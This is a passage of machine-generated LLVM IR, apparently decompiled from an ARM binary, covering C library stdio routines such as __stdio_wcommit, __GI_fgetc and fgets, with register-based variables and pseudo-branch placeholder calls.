  %v0_167e4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_167e4, label %dec_label_pc_167e8, label %dec_label_pc_167c8

dec_label_pc_167e8:                               ; preds = %dec_label_pc_167d4
  %v0_167e8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_167e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_167ec

dec_label_pc_167ec:                               ; preds = %dec_label_pc_167c8, %dec_label_pc_167e8
  %v0_167ec = phi i32 [ %v0_167e8, %dec_label_pc_167e8 ], [ %v2_167c8, %dec_label_pc_167c8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_167ec = icmp eq i32 %v0_167ec, 0
  %v2_167f8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_167ec, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_167ec
  %v1_167f8 = load i32, i32* %r6.global-to-local, align 4
  %v3_167f8 = add i32 %v2_167f8.pre, 64
  %v4_167f8 = inttoptr i32 %v3_167f8 to i32*
  store i32 %v1_167f8, i32* %v4_167f8, align 4
  %v1_167fc = load i32, i32* %r1.global-to-local, align 4
  %v2_167fc = load i32, i32* %r5.global-to-local, align 4
  %v3_167fc = add i32 %v2_167fc, 60
  %v4_167fc = inttoptr i32 %v3_167fc to i32*
  store i32 %v1_167fc, i32* %v4_167fc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_167ec
  %v2_167f0 = add i32 %v2_167f8.pre, 8
  %v3_167f0 = inttoptr i32 %v2_167f0 to i32*
  %v4_167f0 = load i32, i32* %v3_167f0, align 4
  store i32 %v4_167f0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16800 = add i32 %v2_167f8.pre, 20
  %v4_16800 = inttoptr i32 %v3_16800 to i32*
  store i32 %v4_167f0, i32* %v4_16800, align 4
  %v1_16804 = load i32, i32* %r2.global-to-local, align 4
  %v2_16804 = trunc i32 %v1_16804 to i16
  %v3_16804 = load i32, i32* %r5.global-to-local, align 4
  %v4_16804 = inttoptr i32 %v3_16804 to i16*
  store i16 %v2_16804, i16* %v4_16804, align 2
  %v1_16808 = load i32, i32* %r3.global-to-local, align 4
  %v2_16808 = load i32, i32* %r5.global-to-local, align 4
  %v3_16808 = add i32 %v2_16808, 24
  %v4_16808 = inttoptr i32 %v3_16808 to i32*
  store i32 %v1_16808, i32* %v4_16808, align 4
  %v1_1680c = load i32, i32* %r3.global-to-local, align 4
  %v2_1680c = load i32, i32* %r5.global-to-local, align 4
  %v3_1680c = add i32 %v2_1680c, 28
  %v4_1680c = inttoptr i32 %v3_1680c to i32*
  store i32 %v1_1680c, i32* %v4_1680c, align 4
  %v1_16810 = load i32, i32* %r3.global-to-local, align 4
  %v2_16810 = load i32, i32* %r5.global-to-local, align 4
  %v3_16810 = add i32 %v2_16810, 16
  %v4_16810 = inttoptr i32 %v3_16810 to i32*
  store i32 %v1_16810, i32* %v4_16810, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16814 = load i32, i32* %sl.global-to-local, align 4
  %v1_16814 = inttoptr i32 %v0_16814 to i32*
  %v2_16814 = load i32, i32* %v1_16814, align 4
  store i32 %v2_16814, i32* %r0.global-to-local, align 4
  %v3_16814 = add i32 %v0_16814, 4
  %v4_16814 = inttoptr i32 %v3_16814 to i32*
  %v5_16814 = load i32, i32* %v4_16814, align 4
  store i32 %v5_16814, i32* %r1.global-to-local, align 4
  %v6_16814 = add i32 %v0_16814, 8
  %v7_16814 = inttoptr i32 %v6_16814 to i32*
  %v8_16814 = load i32, i32* %v7_16814, align 4
  store i32 %v8_16814, i32* %r2.global-to-local, align 4
  %v1_1681c = load i32, i32* %r5.global-to-local, align 4
  %v2_1681c = add i32 %v1_1681c, 52
  %v3_1681c = inttoptr i32 %v2_1681c to i32*
  store i32 1, i32* %v3_1681c, align 4
  %v0_16820 = load i32, i32* %r5.global-to-local, align 4
  %v1_16820 = add i32 %v0_16820, 56
  store i32 %v1_16820, i32* %r3.global-to-local, align 4
  %v2_16824 = load i32, i32* %r0.global-to-local, align 4
  %v1_16828 = inttoptr i32 %v1_16820 to i32*
  store i32 %v2_16824, i32* %v1_16828, align 4
  %v3_16828 = add i32 %v0_16820, 60
  %v4_16828 = inttoptr i32 %v3_16828 to i32*
  %v5_16828 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16828, i32* %v4_16828, align 4
  %v6_16828 = add i32 %v0_16820, 64
  %v7_16828 = inttoptr i32 %v6_16828 to i32*
  %v8_16828 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16828, i32* %v7_16828, align 4
  %v0_1682c = load i32, i32* %r5.global-to-local, align 4
  %v1_1682c = add i32 %v0_1682c, 32
  %v2_1682c = inttoptr i32 %v1_1682c to i32*
  %v3_1682c = load i32, i32* %v2_1682c, align 4
  store i32 %v3_1682c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16830 = icmp eq i32 %v3_1682c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_16838 = add i32 %v3_1682c, 56
  store i32 %v1_16838, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_16830, label %dec_label_pc_16844, label %dec_label_pc_167a8

dec_label_pc_16844:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_16848 = load i32, i32* %r7.global-to-local, align 4
  %v2_16848 = add i32 %v0_16848, 76
  %v3_16848 = inttoptr i32 %v2_16848 to i32*
  %v4_16848 = load i32, i32* %v3_16848, align 4
  store i32 %v4_16848, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_16848 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1686814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1686814, label %dec_label_pc_16870, label %dec_label_pc_16854

dec_label_pc_16854:                               ; preds = %dec_label_pc_16844, %dec_label_pc_16868
  %v1_1685c = phi i32 [ %storemerge, %dec_label_pc_16868 ], [ %storemerge12, %dec_label_pc_16844 ]
  %v1_16854 = inttoptr i32 %v1_1685c to i16*
  %v2_16854 = load i16, i16* %v1_16854, align 2
  %v3_16854 = zext i16 %v2_16854 to i32
  store i32 %v3_16854, i32* %r3.global-to-local, align 4
  %v1_16858 = and i32 %v3_16854, 64
  %v2_16858 = icmp eq i32 %v1_16858, 0
  br i1 %v2_16858, label %dec_label_pc_16868, label %bb39

bb39:                                             ; preds = %dec_label_pc_16854
  store i32 %v1_1685c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16868

dec_label_pc_16868:                               ; preds = %dec_label_pc_16854, %bb39
  %v1_16860 = xor i1 %v2_16858, true
  call void @__pseudo_cond_branch(i1 %v1_16860, i32 ptrtoint (i32* @global_var_16898.639 to i32))
  %v0_16864 = load i32, i32* %r4.global-to-local, align 4
  %v1_16864 = add i32 %v0_16864, 32
  %storemerge.in = inttoptr i32 %v1_16864 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16868 = icmp eq i32 %storemerge, 0
  br i1 %v2_16868, label %dec_label_pc_16870, label %dec_label_pc_16854

dec_label_pc_16870:                               ; preds = %dec_label_pc_16868, %dec_label_pc_16844
  %v2_16874 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16874, i32* %r4.global-to-local, align 4
  %v1_16878 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16878

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1682c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_167cc, { 1, 0 }
  uselistorder i32 %v4_1678c, { 2, 1, 0 }
  uselistorder i32 %v4_1675c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_16868, { 1, 0 }
  uselistorder label %dec_label_pc_16854, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_167ec, { 1, 0 }
  uselistorder label %dec_label_pc_167c8, { 1, 0 }
  uselistorder label %dec_label_pc_167a8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16898 = load i32, i32* @r4, align 4
  store i32 %v3_16898, i32* %stack_var_-8, align 4
  %v1_1689c = add i32 %arg1, 8
  %v2_1689c = inttoptr i32 %v1_1689c to i32*
  %v3_1689c = load i32, i32* %v2_1689c, align 4
  store i32 %v3_1689c, i32* @r1, align 4
  %v1_168a0 = add i32 %arg1, 16
  %v2_168a0 = inttoptr i32 %v1_168a0 to i32*
  %v3_168a0 = load i32, i32* %v2_168a0, align 4
  %v9_168a4 = icmp eq i32 %v3_168a0, %v3_1689c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_168a4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1689c, i32* %v2_168a0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_168b0 = xor i1 %v9_168a4, true
  call void @__pseudo_cond_branch(i1 %v1_168b0, i32 ptrtoint (i32* @global_var_18288.640 to i32))
  %v0_168b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_168b4 = add i32 %v0_168b4, 8
  %v2_168b4 = inttoptr i32 %v1_168b4 to i32*
  %v3_168b4 = load i32, i32* %v2_168b4, align 4
  %v1_168b8 = add i32 %v0_168b4, 16
  %v2_168b8 = inttoptr i32 %v1_168b8 to i32*
  %v3_168b8 = load i32, i32* %v2_168b8, align 4
  %v2_168bc = sub i32 %v3_168b8, %v3_168b4
  %v2_168c0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_168c0, i32* @r4, align 4
  ret i32 %v2_168bc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_168c8 = load i32, i32* @r4, align 4
  store i32 %v3_168c8, i32* %stack_var_-20, align 4
  %v6_168c8 = load i32, i32* @r5, align 4
  %v9_168c8 = load i32, i32* @r6, align 4
  %v12_168c8 = load i32, i32* @r7, align 4
  %v15_168c8 = load i32, i32* @lr, align 4
  %v1_168cc = add i32 %arg1, 52
  %v2_168cc = inttoptr i32 %v1_168cc to i32*
  %v3_168cc = load i32, i32* %v2_168cc, align 4
  store i32 %v3_168cc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_168d0 = icmp eq i32 %v3_168cc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_168d0, label %dec_label_pc_16904, label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %entry
  %v1_168e0 = add i32 %arg1, 16
  %v2_168e0 = inttoptr i32 %v1_168e0 to i32*
  %v3_168e0 = load i32, i32* %v2_168e0, align 4
  store i32 %v3_168e0, i32* %r2.global-to-local, align 4
  %v1_168e4 = add i32 %arg1, 24
  %v2_168e4 = inttoptr i32 %v1_168e4 to i32*
  %v3_168e4 = load i32, i32* %v2_168e4, align 4
  store i32 %v3_168e4, i32* %r3.global-to-local, align 4
  %v3_168e8 = icmp uge i32 %v3_168e0, %v3_168e4
  store i1 %v3_168e8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_168e8, label %dec_label_pc_168f8, label %.thread

.thread:                                          ; preds = %dec_label_pc_168e0
  %v2_168ec = inttoptr i32 %v3_168e0 to i8*
  %v3_168ec = load i8, i8* %v2_168ec, align 1
  %v4_168ec = zext i8 %v3_168ec to i32
  store i32 %v4_168ec, i32* %r5.global-to-local, align 4
  %v6_168ec = add i32 %v3_168e0, 1
  store i32 %v6_168ec, i32* %r2.global-to-local, align 4
  store i32 %v6_168ec, i32* %v2_168e0, align 4
  br label %dec_label_pc_169fc

dec_label_pc_168f8:                               ; preds = %dec_label_pc_168e0
  %v1_168f8 = inttoptr i32 %arg1 to i16*
  %v2_168f8 = call i32 @getc_unlocked(i16* %v1_168f8)
  store i32 %v2_168f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_169fc

dec_label_pc_16904:                               ; preds = %entry
  %v0_16904 = call i32 @__aeabi_read_tp()
  %v0_16908 = load i32, i32* @r7, align 4
  %v1_16908 = add i32 %v0_16908, 64
  %v2_16908 = inttoptr i32 %v1_16908 to i32*
  %v3_16908 = load i32, i32* %v2_16908, align 4
  store i32 %v3_16908, i32* %r3.global-to-local, align 4
  %v1_1690c = add i32 %v0_16904, -1168
  store i32 %v1_1690c, i32* @r6, align 4
  %v3_16910 = icmp uge i32 %v3_16908, %v1_1690c
  store i1 %v3_16910, i1* %cpsr_c.global-to-local, align 1
  %v9_16910 = icmp eq i32 %v3_16908, %v1_1690c
  br i1 %v9_16910, label %dec_label_pc_16958, label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %dec_label_pc_16904
  %v1_16918 = add i32 %v0_16908, 56
  store i32 %v1_16918, i32* @r5, align 4
  store i32 %v1_16918, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16924

dec_label_pc_16924:                               ; preds = %dec_label_pc_16930.dec_label_pc_16924_crit_edge, %dec_label_pc_16918
  %v0_16924 = phi i32 [ %v0_16924.pre, %dec_label_pc_16930.dec_label_pc_16924_crit_edge ], [ %v1_16918, %dec_label_pc_16918 ]
  %v1_16924 = inttoptr i32 %v0_16924 to i32*
  %v2_16924 = load i32, i32* %v1_16924, align 4
  store i32 %v2_16924, i32* %r3.global-to-local, align 4
  %v1_16928 = load i32, i32* @r4, align 4
  %v3_16928 = icmp uge i32 %v2_16924, %v1_16928
  store i1 %v3_16928, i1* %cpsr_c.global-to-local, align 1
  %v9_16928 = icmp eq i32 %v2_16924, %v1_16928
  br i1 %v9_16928, label %dec_label_pc_16930, label %dec_label_pc_16948

dec_label_pc_16930:                               ; preds = %dec_label_pc_16924
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16940 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16940, label %dec_label_pc_16944, label %dec_label_pc_16930.dec_label_pc_16924_crit_edge

dec_label_pc_16930.dec_label_pc_16924_crit_edge:  ; preds = %dec_label_pc_16930
  %v0_16924.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16924

dec_label_pc_16944:                               ; preds = %dec_label_pc_16930
  %v0_16944 = load i32, i32* @r4, align 4
  store i32 %v0_16944, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16948

dec_label_pc_16948:                               ; preds = %dec_label_pc_16924, %dec_label_pc_16944
  %v0_16948 = phi i32 [ %v0_16944, %dec_label_pc_16944 ], [ %v2_16924, %dec_label_pc_16924 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16948 = icmp eq i32 %v0_16948, 0
  br i1 %v2_16948, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16948
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16948, %bb
  store i32 92500, i32* @lr, align 4
  %v1_16950 = xor i1 %v2_16948, true
  call void @__pseudo_cond_branch(i1 %v1_16950, i32 ptrtoint (i32* @global_var_14734.518 to i32))
  %v0_16954 = load i32, i32* @r6, align 4
  %v1_16954 = load i32, i32* @r7, align 4
  %v2_16954 = add i32 %v1_16954, 64
  %v3_16954 = inttoptr i32 %v2_16954 to i32*
  store i32 %v0_16954, i32* %v3_16954, align 4
  %v0_16958.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16958

dec_label_pc_16958:                               ; preds = %dec_label_pc_16904, %bb18
  %v1_16968 = phi i32 [ %v0_16908, %dec_label_pc_16904 ], [ %v0_16958.pre, %bb18 ]
  %v1_16958 = add i32 %v1_16968, 60
  %v2_16958 = inttoptr i32 %v1_16958 to i32*
  %v3_16958 = load i32, i32* %v2_16958, align 4
  store i32 %v3_16958, i32* %r2.global-to-local, align 4
  %v1_1695c = add i32 %v1_16968, 16
  %v2_1695c = inttoptr i32 %v1_1695c to i32*
  %v3_1695c = load i32, i32* %v2_1695c, align 4
  store i32 %v3_1695c, i32* @r1, align 4
  %v1_16960 = add i32 %v1_16968, 24
  %v2_16960 = inttoptr i32 %v1_16960 to i32*
  %v3_16960 = load i32, i32* %v2_16960, align 4
  store i32 %v3_16960, i32* %r3.global-to-local, align 4
  %v1_16964 = add i32 %v3_16958, 1
  store i32 %v1_16964, i32* %r2.global-to-local, align 4
  store i32 %v1_16964, i32* %v2_16958, align 4
  %v0_1696c = load i32, i32* @r1, align 4
  %v1_1696c = load i32, i32* %r3.global-to-local, align 4
  %v3_1696c = icmp uge i32 %v0_1696c, %v1_1696c
  store i1 %v3_1696c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1696c, label %dec_label_pc_1697c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16958
  %v2_16970 = inttoptr i32 %v0_1696c to i8*
  %v3_16970 = load i8, i8* %v2_16970, align 1
  %v4_16970 = zext i8 %v3_16970 to i32
  store i32 %v4_16970, i32* %r5.global-to-local, align 4
  %v6_16970 = add i32 %v0_1696c, 1
  store i32 %v6_16970, i32* @r1, align 4
  %v2_16974 = load i32, i32* @r7, align 4
  %v3_16974 = add i32 %v2_16974, 16
  %v4_16974 = inttoptr i32 %v3_16974 to i32*
  store i32 %v6_16970, i32* %v4_16974, align 4
  br label %dec_label_pc_16988

dec_label_pc_1697c:                               ; preds = %dec_label_pc_16958
  %v0_1697c = load i32, i32* @r7, align 4
  %v1_16980 = inttoptr i32 %v0_1697c to i16*
  %v2_16980 = call i32 @getc_unlocked(i16* %v1_16980)
  store i32 %v2_16980, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16988

dec_label_pc_16988:                               ; preds = %.thread2, %dec_label_pc_1697c
  %v0_16988 = load i32, i32* @r7, align 4
  %v1_16988 = add i32 %v0_16988, 60
  %v2_16988 = inttoptr i32 %v1_16988 to i32*
  %v3_16988 = load i32, i32* %v2_16988, align 4
  %v1_1698c = add i32 %v3_16988, -1
  store i32 %v1_1698c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16990 = icmp eq i32 %v1_1698c, 0
  store i32 %v1_1698c, i32* %v2_16988, align 4
  br i1 %v2_16990, label %dec_label_pc_1699c, label %dec_label_pc_169fc

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16988
  %v0_1699c = load i32, i32* %r3.global-to-local, align 4
  %v1_1699c = load i32, i32* @r7, align 4
  %v2_1699c = add i32 %v1_1699c, 64
  %v3_1699c = inttoptr i32 %v2_1699c to i32*
  store i32 %v0_1699c, i32* %v3_1699c, align 4
  %v0_169a0 = load i32, i32* @r7, align 4
  %v1_169a0 = add i32 %v0_169a0, 56
  store i32 %v1_169a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %dec_label_pc_169d4.dec_label_pc_169a4_crit_edge, %dec_label_pc_1699c
  %v0_169ac = phi i32 [ %v0_169ac.pre, %dec_label_pc_169d4.dec_label_pc_169a4_crit_edge ], [ %v1_169a0, %dec_label_pc_1699c ]
  %v0_169a4 = phi i32 [ %v0_169a4.pre, %dec_label_pc_169d4.dec_label_pc_169a4_crit_edge ], [ %v0_169a0, %dec_label_pc_1699c ]
  %v1_169a4 = add i32 %v0_169a4, 56
  %v2_169a4 = inttoptr i32 %v1_169a4 to i32*
  %v3_169a4 = load i32, i32* %v2_169a4, align 4
  store i32 %v3_169a4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_169ac, i32* %r2.global-to-local, align 4
  %v1_169b022 = inttoptr i32 %v0_169ac to i32*
  %v2_169b023 = load i32, i32* %v1_169b022, align 4
  store i32 %v2_169b023, i32* %r3.global-to-local, align 4
  %v3_169b425 = icmp uge i32 %v2_169b023, %v3_169a4
  store i1 %v3_169b425, i1* %cpsr_c.global-to-local, align 1
  %v9_169b431 = icmp eq i32 %v2_169b023, %v3_169a4
  br i1 %v9_169b431, label %dec_label_pc_169bc, label %dec_label_pc_169d4

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169a4, %dec_label_pc_169bc.dec_label_pc_169b0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_169cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_169cc, label %dec_label_pc_169d0, label %dec_label_pc_169bc.dec_label_pc_169b0_crit_edge

dec_label_pc_169bc.dec_label_pc_169b0_crit_edge:  ; preds = %dec_label_pc_169bc
  %v0_169b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_169b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_169b0 = inttoptr i32 %v0_169b0.pre to i32*
  %v2_169b0 = load i32, i32* %v1_169b0, align 4
  store i32 %v2_169b0, i32* %r3.global-to-local, align 4
  %v3_169b4 = icmp uge i32 %v2_169b0, %v1_169b4.pre
  store i1 %v3_169b4, i1* %cpsr_c.global-to-local, align 1
  %v9_169b4 = icmp eq i32 %v2_169b0, %v1_169b4.pre
  br i1 %v9_169b4, label %dec_label_pc_169bc, label %dec_label_pc_169d4

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169bc
  %v0_169d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_169d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169d4

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169a4, %dec_label_pc_169bc.dec_label_pc_169b0_crit_edge, %dec_label_pc_169d0
  %v0_169dc = phi i32 [ %v0_169d0, %dec_label_pc_169d0 ], [ %v2_169b023, %dec_label_pc_169a4 ], [ %v2_169b0, %dec_label_pc_169bc.dec_label_pc_169b0_crit_edge ]
  %v1_169d4 = phi i32 [ %v0_169d0, %dec_label_pc_169d0 ], [ %v3_169a4, %dec_label_pc_169a4 ], [ %v1_169b4.pre, %dec_label_pc_169bc.dec_label_pc_169b0_crit_edge ]
  %v3_169d4 = icmp uge i32 %v0_169dc, %v1_169d4
  store i1 %v3_169d4, i1* %cpsr_c.global-to-local, align 1
  %v9_169d4 = icmp eq i32 %v0_169dc, %v1_169d4
  br i1 %v9_169d4, label %dec_label_pc_169dc, label %dec_label_pc_169d4.dec_label_pc_169a4_crit_edge

dec_label_pc_169d4.dec_label_pc_169a4_crit_edge:  ; preds = %dec_label_pc_169d4
  %v0_169a4.pre = load i32, i32* @r7, align 4
  %v0_169ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_169a4

dec_label_pc_169dc:                               ; preds = %dec_label_pc_169d4
  %v2_169dc = icmp ne i32 %v1_169d4, 0
  store i1 %v2_169dc, i1* %cpsr_c.global-to-local, align 1
  %v7_169e0 = icmp slt i32 %v1_169d4, 2
  br i1 %v7_169e0, label %dec_label_pc_169fc, label %dec_label_pc_169e4

dec_label_pc_169e4:                               ; preds = %dec_label_pc_169dc
  %v0_169e8 = load i32, i32* @r1, align 4
  %v1_169e8 = add i32 %v0_169e8, 129
  store i32 %v1_169e8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_169fc

dec_label_pc_169fc:                               ; preds = %.thread, %dec_label_pc_16988, %dec_label_pc_169e4, %dec_label_pc_169dc, %dec_label_pc_168f8
  %v0_169fc = load i32, i32* %r5.global-to-local, align 4
  %v2_16a04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a04, i32* @r4, align 4
  store i32 %v6_168c8, i32* @r5, align 4
  store i32 %v9_168c8, i32* @r6, align 4
  store i32 %v12_168c8, i32* @r7, align 4
  store i32 %v15_168c8, i32* @lr, align 4
  ret i32 %v0_169fc

; uselistorder directives
  uselistorder i32 %v0_169d0, { 1, 0, 2 }
  uselistorder i32 %v1_169b4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1696c, { 1, 0, 2 }
  uselistorder i32 %v1_16968, { 0, 2, 1 }
  uselistorder i32 %v1_16928, { 1, 0 }
  uselistorder i32 %v3_168e0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_169fc, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_169d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_169bc, { 1, 0 }
  uselistorder label %dec_label_pc_16988, { 1, 0 }
  uselistorder label %dec_label_pc_16958, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16948, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16a0c = load i32, i32* @r4, align 4
  store i32 %v3_16a0c, i32* %stack_var_-32, align 4
  %v6_16a0c = load i32, i32* @r5, align 4
  %v9_16a0c = load i32, i32* @r6, align 4
  %v12_16a0c = load i32, i32* @r7, align 4
  %v15_16a0c = load i32, i32* @r8, align 4
  %v24_16a0c = load i32, i32* @lr, align 4
  %v1_16a10 = add i32 %arg3, 52
  %v2_16a10 = inttoptr i32 %v1_16a10 to i32*
  %v3_16a10 = load i32, i32* %v2_16a10, align 4
  store i32 %v3_16a10, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16a14 = icmp eq i32 %v3_16a10, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16a14, label %dec_label_pc_16a28, label %dec_label_pc_16a8c

dec_label_pc_16a28:                               ; preds = %entry
  %v0_16a28 = call i32 @__aeabi_read_tp()
  %v1_16a2c = add i32 %arg3, 64
  %v2_16a2c = inttoptr i32 %v1_16a2c to i32*
  %v3_16a2c = load i32, i32* %v2_16a2c, align 4
  store i32 %v3_16a2c, i32* %r3.global-to-local, align 4
  %v1_16a30 = add i32 %v0_16a28, -1168
  store i32 %v1_16a30, i32* @r8, align 4
  %v3_16a34 = icmp uge i32 %v3_16a2c, %v1_16a30
  store i1 %v3_16a34, i1* %cpsr_c.global-to-local, align 1
  %v9_16a34 = icmp eq i32 %v3_16a2c, %v1_16a30
  br i1 %v9_16a34, label %dec_label_pc_16a80, label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16a28
  %v1_16a3c = add i32 %arg3, 56
  store i32 %v1_16a3c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_16a3c, i32* %r2.global-to-local, align 4
  %v0_16a48 = load i32, i32* @r6, align 4
  store i32 %v0_16a48, i32* @r4, align 4
  %v1_16a4c36 = inttoptr i32 %v1_16a3c to i32*
  %v2_16a4c37 = load i32, i32* %v1_16a4c36, align 4
  store i32 %v2_16a4c37, i32* %r3.global-to-local, align 4
  %v3_16a5039 = icmp uge i32 %v2_16a4c37, %v0_16a48
  store i1 %v3_16a5039, i1* %cpsr_c.global-to-local, align 1
  %v9_16a5045 = icmp eq i32 %v2_16a4c37, %v0_16a48
  br i1 %v9_16a5045, label %dec_label_pc_16a58, label %dec_label_pc_16a70

dec_label_pc_16a58:                               ; preds = %dec_label_pc_16a3c, %dec_label_pc_16a58.dec_label_pc_16a4c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16a68 = load i1, i1* %cpsr_c.global-to-local, align 1
